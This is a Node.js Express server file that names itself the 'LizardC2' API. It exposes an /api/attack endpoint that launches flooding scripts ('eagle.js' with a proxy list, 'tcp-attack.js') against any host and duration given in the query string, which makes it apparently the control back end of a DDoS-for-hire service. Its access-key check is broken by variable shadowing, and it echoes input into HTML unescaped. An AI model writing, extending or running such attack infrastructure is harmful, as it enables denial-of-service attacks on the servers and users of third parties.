// LIZARD APIs
const express = require('express');

const app = express();
const port = 8080;

const key = "@lizardpredator";

app.get('/api/attack', (req, res) => {
  try {
    const key = req.query.key;  
    const host = req.query.host;
    const time = parseInt(req.query.time);
    const method = req.query.method;

    if (req.query.key !== key) {
      return res.status(401).send('Key not working');
    }

    if (method === 'EAGLE') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['eagle.js', host, time, '100', '1000', 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>Lizard Api</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'TCP-ATTACK') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['tcp-attack.js', host, time, '1024', '10']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>Lizard Api</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else {
      console.error('Metode yang salah..');
      res.status(400).send('Metode yang salah..');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Ada masalah.');
  }
});

app.listen(port, () => {
  console.log(`API LizardC2 Started To: ${port} port`);
});
